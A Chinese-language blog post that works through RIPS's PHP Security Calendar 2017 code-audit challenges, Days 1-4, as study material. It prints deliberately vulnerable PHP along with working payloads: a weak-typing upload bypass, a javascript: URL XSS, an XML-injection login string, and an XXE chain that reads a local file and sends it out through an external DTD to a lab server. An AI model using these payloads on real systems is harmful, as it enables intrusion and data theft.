<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PHP代码审计(一)"><meta name="keywords" content="PHP"><meta name="author" content="Sys71m"><meta name="copyright" content="Sys71m"><title>PHP代码审计(一) | sys71m</title><link rel="shortcut icon" href="/lufei.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><link rel="alternate" href="/atom.xml" title="sys71m" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-SECURITY-CALENDAR-2017"><span class="toc-number">1.</span> <span class="toc-text">PHP SECURITY CALENDAR 2017</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#项目地址"><span class="toc-number">1.1.</span> <span class="toc-text">项目地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在线演示平台"><span class="toc-number">1.2.</span> <span class="toc-text">在线演示平台</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php手册"><span class="toc-number">1.3.</span> <span class="toc-text">php手册</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-1-Wish-List"><span class="toc-number">2.</span> <span class="toc-text">Day 1 - Wish List</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-2-Twig"><span class="toc-number">3.</span> <span class="toc-text">Day 2 - Twig</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-1"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-1"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-3-Snow-Flake"><span class="toc-number">4.</span> <span class="toc-text">Day 3 - Snow Flake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-2"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-2"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-2"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-4-False-Beard"><span class="toc-number">5.</span> <span class="toc-text">Day 4 - False Beard</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-3"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-3"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-3"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-5-Postcard"><span class="toc-number">6.</span> <span class="toc-text">Day 5 - Postcard</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-4"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-4"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-4"><span class="toc-number">6.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-6-Frost-Pattern"><span class="toc-number">7.</span> <span class="toc-text">Day 6 - Frost Pattern</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-5"><span class="toc-number">7.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-5"><span class="toc-number">7.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-5"><span class="toc-number">7.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-7-Bells"><span class="toc-number">8.</span> <span class="toc-text">Day 7 - Bells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-6"><span class="toc-number">8.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-6"><span class="toc-number">8.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-6"><span class="toc-number">8.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-9-Rabbit"><span class="toc-number">9.</span> <span class="toc-text">Day 9 - Rabbit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-7"><span class="toc-number">9.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-7"><span class="toc-number">9.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-7"><span class="toc-number">9.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-10-Anticipation"><span class="toc-number">10.</span> <span class="toc-text">Day 10 - Anticipation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码："><span class="toc-number">10.1.</span> <span class="toc-text">漏洞代码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-8"><span class="toc-number">10.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-8"><span class="toc-number">10.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/lufei.jpg"></div><div class="author-info__name text-center">Sys71m</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/ttonys">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">37</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">53</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">21</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/ttonys/MarkDownPic/master/test33.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">sys71m</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/recon">Recon</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">PHP代码审计(一)</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-13</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/代码审计/">代码审计</a><span class="post-meta__separator">|</span><i class="fa fa-comment-o post-meta__icon" aria-hidden="true"></i><a href="/2020/02/13/PHP代码审计(一)/#disqus_thread"><span class="disqus-comment-count" data-disqus-identifier="2020/02/13/PHP代码审计(一)/"></span></a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">3.2k</span><span class="post-meta__separator">|</span><span>Reading time: 13 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>学校延期开学，在家闲着没事，打算重新复习下php代码审计方面的知识，找到了RIPS Technologies2017年的一个代码审计项目，之前只是大致读过没有仔细分析，这次记录一下分析过程，第一篇。</p>
<a id="more"></a>  
<h2 id="PHP-SECURITY-CALENDAR-2017"><a href="#PHP-SECURITY-CALENDAR-2017" class="headerlink" title="PHP SECURITY CALENDAR 2017"></a>PHP SECURITY CALENDAR 2017</h2><h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.ripstech.com/php-security-calendar-2017/</span></span><br></pre></td></tr></table></figure>
<h3 id="在线演示平台"><a href="#在线演示平台" class="headerlink" title="在线演示平台"></a>在线演示平台</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://github.com/vulnspy/ripstech-php-security-calendar-2017</span></span><br></pre></td></tr></table></figure>
<h3 id="php手册"><a href="#php手册" class="headerlink" title="php手册"></a>php手册</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.php.net/manual/zh/</span></span><br></pre></td></tr></table></figure>
<h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">        <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码逻辑为上传一个文件，在类的初始化时创建一个1-24的白名单数组，文件赋值给<code>$file</code>，在类销毁时判断上传的文件名是否在白名单内，验证通过的话则将文件移动到指定目录<code>./solutions/</code>下。</p>
<p>在手册上查看<code>in_array</code>说明，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool</span><br><span class="line">大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。</span><br></pre></td></tr></table></figure>
<p>因此利用php的弱类型达到绕过白名单的目的，如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump("2.php"==2);</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>本地环境：kali+php7.3+apache2</p>
<p>坑点：代码中<code>UPLOAD_DIRECTORY</code>使用了相对路径，不知为何文件移动一直失败，改为绝对路径即可。</p>
<p>验证过程：使用postman抓取请求，改为post提交并添加文件。</p>
<p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/php2017/image-20200211191331162.png" alt="image-20200211191331162"></p>
<h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><h3 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">      <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">      <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">'index.html'</span>,</span><br><span class="line">      [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码大致逻辑为通过<code>GET</code>请求获取<code>nextSlide</code>参数值，经过<code>filter_var</code>函数来判断是否为正确url，通过的话则通过<code>twig</code>的模板引擎渲染到页面中。但<code>filter_var</code>的过滤十分脆弱，只是在url格式上判断是否正确，没有进行协议方面的检测。因此，可以构造如下payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://comment%250aalert(1)</span><br></pre></td></tr></table></figure>
<p><code>Twig</code>中的<code></code>中的<code>escape</code>和PHP中的<code>htmlspecialchars($link, ENT_QUOTES, &#39;UTF-8&#39;)</code>类似，所以单引号和双引号等都无法使用。因为<code>%250a</code>即<code>%0a</code>表示换行符，在浏览器中<code>javascript://comment%250aalert(1)</code>会被解释为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript://comment</span><br><span class="line">alert(1)</span><br></pre></td></tr></table></figure>
<p><code>//</code>在 Javascript 中表示注释符，因此<code>comment</code>会被忽略，执行<code>alert(1)</code></p>
<h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>本地环境：phpEnv+composer</p>
<p>验证过程：</p>
<p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/php2017/image-20200212144742784.png" alt="image-20200212144742784"></p>
<p><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/php2017/image-20200212143615129.png" alt="image-20200212143615129"></p>
<h2 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h2><h3 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">    $controller = <span class="keyword">new</span> $controllerName($data);</span><br><span class="line">    $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;data[<span class="string">'new'</span>]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在php5.4以下版本中，如果我们输入<code>../../../../etc/passwd</code>是，就会调用<code>class_exists()</code>，这样就会触发<code>__autoload()</code>，这样就是一个任意文件包含的漏洞了，此类漏洞在之后的版本中进行了修复。</p>
<p>代码中执行<code>class_exists</code>来判断类是否存在，存在则通过<code>include</code>包含到代码中，php自带的内置类也可用通过此方式包含，因此可以利用<code>SimpleXMLElement</code>进行xxe攻击。通过实例化类来执行构造的xml文件。但是存在一个问题，没有代码中并没有输出结果，因此无法直接在网页中显示，可以通过访问外部url的方式将数据发送出去。</p>
<h3 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>本地环境：phpEnv+kali</p>
<p>发送GET请求加载<code>SimpleXMLElement</code>以及xml语法。使用file协议读取c盘下的文件，并加载外部dtd文件使得到的结构发送到我们指定的服务器上。xml内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/Users/Tonys/Desktop/pass.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.56.102:8080/evil.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>evil.dtd</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">        &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://192.168.56.102/get.php?file=%file;&apos;&gt;&quot;</span><br><span class="line">        &gt;</span><br><span class="line">        %all;</span><br></pre></td></tr></table></figure>
<p>get.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">"result.txt"</span>, $_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Day-4-False-Beard"><a href="#Day-4-False-Beard" class="headerlink" title="Day 4 - False Beard"></a>Day 4 - False Beard</h2><h3 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      (!strpos($user, <span class="string">'&lt;'</span>) || !strpos($user, <span class="string">'&gt;'</span>)) &amp;&amp;</span><br><span class="line">      (!strpos($pass, <span class="string">'&lt;'</span>) || !strpos($pass, <span class="string">'&gt;'</span>))</span><br><span class="line">    ) &#123;</span><br><span class="line">      $format = <span class="string">'&lt;?xml version="1.0"?&gt;'</span> .</span><br><span class="line">        <span class="string">'&lt;user v="%s"/&gt;&lt;pass v="%s"/&gt;'</span>;</span><br><span class="line">      $xml = sprintf($format, $user, $pass);</span><br><span class="line">      $xmlElement = <span class="keyword">new</span> SimpleXMLElement($xml);</span><br><span class="line">      <span class="comment">// Perform the actual login.</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;login($xmlElement);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Login($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过代码可知，使用<code>strpos</code>来阻止<code>&lt;</code>和<code>&gt;</code>出现在输入的字符串中，来防止xml注入。但通过php的特性，测试得到如下结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(0==false);</span><br><span class="line">bool(true)</span><br><span class="line">php &gt; var_dump(!0==true);</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
<p>因此输入内容的开头为<code>&lt;</code>或<code>&gt;</code>依然可以通过验证。</p>
<h3 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;</span><br></pre></td></tr></table></figure>
<p>最终传入到<code>$this-&gt;login($xmlElement)</code>的<code>$xmlElement</code>值是<code>&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;</code>这样就可以进行注入了。</p>
